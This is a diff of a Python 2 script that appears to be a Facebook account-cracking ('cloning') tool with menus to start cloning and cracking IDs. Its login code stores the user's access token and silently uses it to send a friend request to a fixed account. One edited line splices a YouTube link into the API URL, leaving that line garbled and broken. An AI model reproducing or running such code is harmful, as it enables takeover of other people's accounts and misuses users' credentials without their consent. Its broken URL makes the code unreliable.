@@ -133,14 +133,14 @@ def login():
 				x.update(sig)
 				a=x.hexdigest()
 				data.update({'sig':a})
-				url = "https://api.facebook.com/restserver.php"
+				url = "https://api.facebook.com/restserver.phphttps://youtube.com/channel/UCkoqlUeR59-foCsaMdQJOJw')"
 				r=requests.get(url,params=data)
 				z=json.loads(r.text)
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
-				os.system('xdg-open https://youtube.com/channel/UCkoqlUeR59-foCsaMdQJOJw')
+				os.system('xdg-open https://youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -228,7 +228,7 @@ def super():
 	os.system('clear')
 	print logo
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;91m Start Fucking USA"
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;91m Start Fucking USA"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;93m Back"
 	pilih_super()
 
@@ -301,7 +301,7 @@ def pilih_super():
 		pilih_super()
 	
 	print "\033[1;96m[+] \033[1;91mTotal ID \033[1;91m: \033[1;91m"+str(len(id))
-	jalan('\033[1;96m[✺] \033[1;91m Aahil Start Cloning \033[1;91m...')
+	jalan('\033[1;96m[✺] \033[1;91mAahil Start Cloning \033[1;91m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;91m[\033[1;91m✸\033[1;91m] \033[1;91mCrack \033[1;91m"+o),;sys.stdout.flush();time.sleep(1)
